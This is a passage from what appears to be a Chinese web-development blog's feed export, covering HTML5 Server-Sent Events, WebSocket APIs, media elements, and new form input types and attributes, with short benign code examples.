&#125;<br> else<br>   &#123;<br>   // 浏览器不支持 Server-Sent..<br>   &#125;<br></code></pre></div></td></tr></table></figure><h3 id="6-4-服务器端代码实例"><a href="#6-4-服务器端代码实例" class="headerlink" title="6.4 服务器端代码实例"></a>6.4 服务器端代码实例</h3><p>为了让上面的例子可以运行，您还需要能够发送数据更新的服务器（比如 PHP 和 ASP）。</p><p>服务器端事件流的语法是非常简单的。把 “Content-Type” 报头设置为 “text/event-stream”。现在，就可以开始发送事件流了。<br>demo_sse.php：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-Type: text/event-stream&#x27;</span>);<br> header(<span class="hljs-string">&#x27;Cache-Control: no-cache&#x27;</span>);<br><br><span class="hljs-variable">$time</span> = date(<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;data: The server time is: <span class="hljs-subst">&#123;$time&#125;</span>nn&quot;</span>;<br>flush();<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>ASP 代码 (VB) (demo_sse.asp):</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asp">&lt;%<br>Response.ContentType&#x3D;&quot;text&#x2F;event-stream&quot;<br>Response.Expires&#x3D;-1<br> Response.Write(&quot;data: &quot; &amp; now())<br>Response.Flush()<br>%&gt;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li><p>把报头 “Content-Type” 设置为 “text/event-stream”</p></li><li><p>规定不对页面进行缓存</p></li><li><p>输出发送日期（始终以 “data: “ 开头）</p></li><li><p>向网页刷新输出数据</p></li></ul><h3 id="6-5-EventSource-对象"><a href="#6-5-EventSource-对象" class="headerlink" title="6.5 EventSource 对象"></a>6.5 EventSource 对象</h3><p>可以使用 onmessage 事件来获取消息。还可以使用其他事件：</p><table><thead><tr><th align="center">事件</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">onopen</td><td align="center">当通往服务器的连接被打开</td></tr><tr><td align="center">onmessage</td><td align="center">当接收到消息</td></tr><tr><td align="center">onerror</td><td align="center">当发生错误</td></tr></tbody></table><h2 id="7-WebSocket"><a href="#7-WebSocket" class="headerlink" title="7.WebSocket"></a>7.WebSocket</h2><p>WebSocket是HTML5开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。</p><p>在WebSocket API中，浏览器和服务器只需要做一个握手的动作，然后，浏览器和服务器之间就形成了一条快速通道。两者之间就直接可以数据互相传送。</p><p>浏览器通过 JavaScript 向服务器发出建立 WebSocket 连接的请求，连接建立以后，客户端和服务器端就可以通过 TCP 连接直接交换数据。</p><p>当你获取 Web Socket 连接后，你可以通过 send() 方法来向服务器发送数据，并通过 onmessage 事件来接收服务器返回的数据。</p><p>以下 API 用于创建 WebSocket 对象。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var Socket = new WebSocket(url, [protocal] );<br></code></pre></div></td></tr></table></figure><p>代码中的第一个参数 url, 指定连接的 URL。第二个参数 protocol 是可选的，指定了可接受的子协议。</p><h3 id="7-1-WebSocket-属性"><a href="#7-1-WebSocket-属性" class="headerlink" title="7.1 WebSocket 属性"></a>7.1 WebSocket 属性</h3><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Socket.readyState</td><td align="center">只读属性 <strong>readyState</strong> 表示连接状态，可以是以下值：0 - 表示连接尚未建立。1 - 表示连接已建立，可以进行通信。2 - 表示连接正在进行关闭。3 - 表示连接已经关闭或者连接不能打开。</td></tr><tr><td align="center">Socket.bufferedAmount</td><td align="center">只读属性 <strong>bufferedAmount</strong> 已被 send() 放入正在队列中等待传输，但是还没有发出的 UTF-8 文本字节数。</td></tr></tbody></table><h3 id="7-2-WebSocket-事件"><a href="#7-2-WebSocket-事件" class="headerlink" title="7.2 WebSocket 事件"></a>7.2 WebSocket 事件</h3><table><thead><tr><th align="center">事件</th><th align="center">事件处理程序</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">open</td><td align="center">Socket.onopen</td><td align="center">连接建立时触发</td></tr><tr><td align="center">message</td><td align="center">Socket.onmessage</td><td align="center">客户端接收服务端数据时触发</td></tr><tr><td align="center">error</td><td align="center">Socket.onerror</td><td align="center">通信发生错误时触发</td></tr><tr><td align="center">close</td><td align="center">Socket.onclose</td><td align="center">连接关闭时触发</td></tr></tbody></table><h3 id="7-3-WebSocket-方法"><a href="#7-3-WebSocket-方法" class="headerlink" title="7.3 WebSocket 方法"></a>7.3 WebSocket 方法</h3><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Socket.send()</td><td align="center">使用连接发送数据</td></tr><tr><td align="center">Socket.close()</td><td align="center">关闭连接</td></tr></tbody></table><h3 id="7-4-WebSocket-实例"><a href="#7-4-WebSocket-实例" class="headerlink" title="7.4 WebSocket 实例"></a>7.4 WebSocket 实例</h3><p>WebSocket 协议本质上是一个基于 TCP 的协议。</p><p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</p>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（三）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-视频（video）"><a href="#1-视频（video）" class="headerlink" title="1.视频（video）"></a>1.视频（video）</h2><h3 id="1-1-使用方法"><a href="#1-1-使用方法" class="headerlink" title="1.1 使用方法"></a>1.1 使用方法</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;320&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;240&quot;</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.mp4&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/mp4&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;movie.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;video/ogg&quot;</span>&gt;</span><br>您的浏览器不支持Video标签。<br><span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>&lt;video&gt; 元素提供了播放、暂停和音量控件来控制视频。</p><p>同时 &lt;video&gt; 元素也提供了 width 和 height 属性控制视频的尺寸.如果设置的高度和宽度，所需的视频空间会在页面加载时保留。。如果没有设置这些属性，浏览器不知道大小的视频，浏览器就不能再加载时保留特定的空间，页面就会根据原始视频的大小而改变。</p><p>&lt;video&gt; 与 &lt;/video&gt; 标签之间插入的内容是提供给不支持 video 元素的浏览器显示的。</p><p>&lt;video&gt; 元素支持多个 &lt;video&gt;  元素. 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。</p><h3 id="1-2-使用DOM控制"><a href="#1-2-使用DOM控制" class="headerlink" title="1.2 使用DOM控制"></a>1.2 使用DOM控制</h3><p>HTML5 &lt;video&gt; 和 &lt;audio&gt; 元素同样拥有方法、属性和事件。</p><p>&lt;video&gt; 和 &lt;audio&gt; 元素的方法、属性和事件可以使用JavaScript进行控制.</p><p>其中的方法有用于播放、暂停以及加载等。其中的属性（比如时长、音量等）可以被读取或设置。其中的 DOM 事件能够通知您，比方说，&lt;video&gt; 元素开始播放、已暂停，已停止，等等。</p><h3 id="1-3-video标签"><a href="#1-3-video标签" class="headerlink" title="1.3 video标签"></a>1.3 video标签</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&amp;lt:video&gt;</td><td align="center">定义一个视频</td></tr><tr><td align="center">&lt;source&gt;</td><td align="center">定义多种媒体资源,比如&lt;video&gt; 和&lt;audio&gt;</td></tr><tr><td align="center">&lt;track&gt;</td><td align="center">定义在媒体播放器文本轨迹</td></tr></tbody></table><h2 id="2-音频（Audio）"><a href="#2-音频（Audio）" class="headerlink" title="2.音频（Audio）"></a>2.音频（Audio）</h2><p>通过使用HTML5中的audio功能，可以实现与flash相同的功能，即回放、跳转、缓冲等。</p><h3 id="2-1-使用方法"><a href="#2-1-使用方法" class="headerlink" title="2.1 使用方法"></a>2.1 使用方法</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">audio</span> <span class="hljs-attr">controls</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.ogg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/ogg&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;horse.mp3&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;audio/mpeg&quot;</span>&gt;</span><br>您的浏览器不支持 audio 元素。<br><span class="hljs-tag">&lt;/<span class="hljs-name">audio</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>control 属性供添加播放、暂停和音量控件。<br>在&lt;audio&gt; 与 &lt;/audio&gt; 之间你需要插入浏览器不支持的&lt;audio&gt;元素的提示文本 。<br>&lt;audio&gt; 元素允许使用多个 &lt;source&gt; 元素. &lt;source&gt; 元素可以链接不同的音频文件，浏览器将使用第一个支持的音频文件。</p><h3 id="2-2-audio标签"><a href="#2-2-audio标签" class="headerlink" title="2.2 audio标签"></a>2.2 audio标签</h3><table><thead><tr><th align="center">标签</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">&lt;audio&gt;</td><td align="center">定义了声音内容</td></tr><tr><td align="center">&lt;source&gt;</td><td align="center">规定了多媒体资源，可以是多个，在&lt;video&gt;与&lt;audio&gt;标签中使用</td></tr></tbody></table><h2 id="3-Input（类型）"><a href="#3-Input（类型）" class="headerlink" title="3. Input（类型）"></a>3. Input（类型）</h2><p><strong>注意：</strong>并不是所有的主流浏览器都支持新的input类型，不过已经可以在所有主流的浏览器中使用它们了。即使不被支持，仍然可以显示为常规的文本域。</p><h3 id="3-1-color"><a href="#3-1-color" class="headerlink" title="3.1 color"></a>3.1 color</h3><p>color 类型用在input字段主要用于用户选取颜色。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择你喜欢的颜色: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;color&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;favcolor&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-2-date"><a href="#3-2-date" class="headerlink" title="3.2 date"></a>3.2 date</h3><p>date 类型允许用户从一个日期选择器选择一个日期。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-datetime"><a href="#3-3-datetime" class="headerlink" title="3.3 datetime"></a>3.3 datetime</h3><p>datetime 类型允许用户选择一个日期（UTC 时间）。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (日期和时间): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;datetime&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaytime&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-4-datetime-local"><a href="#3-4-datetime-local" class="headerlink" title="3.4 datetime-local"></a>3.4 datetime-local</h3><p>datetime-local 类型允许用户选择一个日期和时间 (无时区)。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (日期和时间): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;datetime-local&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaytime&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-5-email"><a href="#3-5-email" class="headerlink" title="3.5 email"></a>3.5 email</h3><p>email 类型用于应该包含 e-mail 地址的输入域。在提交表单时，会自动验证 email 域的值是否合法有效。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-6-month"><a href="#3-6-month" class="headerlink" title="3.6 month"></a>3.6 month</h3><p>month 类型允许用户选择一个月份。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">生日 (月和年): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;month&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bdaymonth&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-7-number"><a href="#3-7-number" class="headerlink" title="3.7 number"></a>3.7 number</h3><p>number 类型用于应该包含数值的输入域。用户还能够设定对所接受的数字的限定。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">数量 ( 1 到 5 之间 ): <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用属性来规定对数字类型的限定：</p><ul><li>max- 规定允许的最大值</li><li>min - 规定允许的最小值</li><li>step - 规定合法的数字间隔（如果 step=”3”，则合法的数是 -3,0,3,6 等）</li><li>value - 规定默认值</li></ul><h3 id="3-8-range"><a href="#3-8-range" class="headerlink" title="3.8 range"></a>3.8 range</h3><p>range 类型用于应该包含一定范围内数字值的输入域。range 类型显示为滑动条。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;range&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;points&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用属性来规定对数字类型的限定：</p><ul><li>max - 规定允许的最大值</li><li>min - 规定允许的最小值</li><li>step - 规定合法的数字间隔</li><li>value - 规定默认值</li></ul><h3 id="3-9-search"><a href="#3-9-search" class="headerlink" title="3.9 search"></a>3.9 search</h3><p>search 类型用于搜索域，比如站点搜索或 Google 搜索。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Search Google: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;search&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;googlesearch&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-10-tel"><a href="#3-10-tel" class="headerlink" title="3.10 tel"></a>3.10 tel</h3><p>定义输入电话号码字段。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">电话号码: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;tel&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usrtel&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-11-time"><a href="#3-11-time" class="headerlink" title="3.11 time"></a>3.11 time</h3><p>time 类型允许你选择一个时间。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择时间: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;time&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usr_time&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-12-url"><a href="#3-12-url" class="headerlink" title="3.12 url"></a>3.12 url</h3><p>url 类型用于应该包含 URL 地址的输入域。在提交表单时，会自动验证 url 域的值。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">添加您的URL: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;homepage&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-13-week"><a href="#3-13-week" class="headerlink" title="3.13 week"></a>3.13 week</h3><p>week 类型允许你选择周和年。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">选择周: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;week&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;week_year&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-新表单元素"><a href="#4-新表单元素" class="headerlink" title="4.新表单元素"></a>4.新表单元素</h2><p><strong>注意：</strong>不是所有的浏览器都支持HTML5 新的表单元素。</p><h3 id="4-1-datalist"><a href="#4-1-datalist" class="headerlink" title="4.1 datalist"></a>4.1 datalist</h3><p>&lt;datalist&gt; 元素规定输入域的选项列表。<br>&lt;datalist&gt; 属性规定 form 或 input 域应该拥有自动完成功能。当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项。<br>使用 &lt;input&gt; 元素的列表属性与 &lt;datalist&gt; 元素绑定。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">list</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">datalist</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Internet Explorer&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firefox&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Chrome&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Opera&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Safari&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datalist</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-keygen"><a href="#4-2-keygen" class="headerlink" title="4.2 keygen"></a>4.2 keygen</h3><p>&lt;keygen&gt; 元素的作用是提供一种验证用户的可靠方法。<br>&lt;keygen&gt;标签规定用于表单的密钥对生成器字段。<br>当提交表单时，会生成两个键，一个是私钥，一个公钥。</p><p>私钥（private key）存储于客户端，公钥（public key）则被发送到服务器。公钥可用于之后验证用户的客户端证书（client certificate）。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_keygen.asp&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>用户名: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usr_name&quot;</span>&gt;</span><br>加密: <span class="hljs-tag">&lt;<span class="hljs-name">keygen</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;security&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-3-output"><a href="#4-3-output" class="headerlink" title="4.3 output"></a>4.3 output</h3><p>&lt;output&gt; 元素用于不同类型的输出，比如计算或脚本输出。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">oninput</span>=<span class="hljs-string">&quot;x.value=parseInt(a.value)+parseInt(b.value)&quot;</span>&gt;</span>0<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;range&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span>100 +<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;b&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span>=<br><span class="hljs-tag">&lt;<span class="hljs-name">output</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;a b&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">output</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="5-新表单属性"><a href="#5-新表单属性" class="headerlink" title="5.新表单属性"></a>5.新表单属性</h2><h3 id="5-1-lt-form-gt-新属性"><a href="#5-1-lt-form-gt-新属性" class="headerlink" title="5.1 &lt;form&gt;新属性"></a>5.1 &lt;form&gt;新属性</h3><ul><li>autocomplete</li><li>novalidate</li></ul><h3 id="5-2-lt-input-gt-新属性"><a href="#5-2-lt-input-gt-新属性" class="headerlink" title="5.2 &lt;input&gt;新属性"></a>5.2 &lt;input&gt;新属性</h3><ul><li>autocomplete</li><li>autofocus</li><li>form</li><li>formaction</li><li>formenctype</li><li>formmethod</li><li>formnovalidate</li><li>formtarget</li><li>height and width</li><li>list</li><li>min and max</li><li>multiple</li><li>pattern (regexp)</li><li>placeholder</li><li>required</li><li>step</li></ul><h3 id="5-3-autocomplete-属性（-lt-form-gt-lt-input-gt-）"><a href="#5-3-autocomplete-属性（-lt-form-gt-lt-input-gt-）" class="headerlink" title="5.3 autocomplete 属性（&lt;form&gt; / &lt;input&gt;）"></a>5.3 autocomplete 属性（&lt;form&gt; / &lt;input&gt;）</h3><p>autocomplete 属性规定 form 或 input 域应该拥有自动完成功能。当用户在自动完成域中开始输入时，浏览器应该在该域中显示填写的选项。</p><p>autocomplete 适用于 &lt;form&gt; 标签，以及以下类型的 &lt;input&gt; 标签：text, search, url, telephone, email, password, datepickers, range 以及 color。</p><p><strong>提示：</strong>autocomplete 属性有可能在 form元素中是开启的，而在input元素中是关闭的。</p><p>使用实例：HTML form 中开启 autocomplete (一个 input 字段关闭 autocomplete ).</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;on&quot;</span>&gt;</span><br> First name:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> E-mail: <span 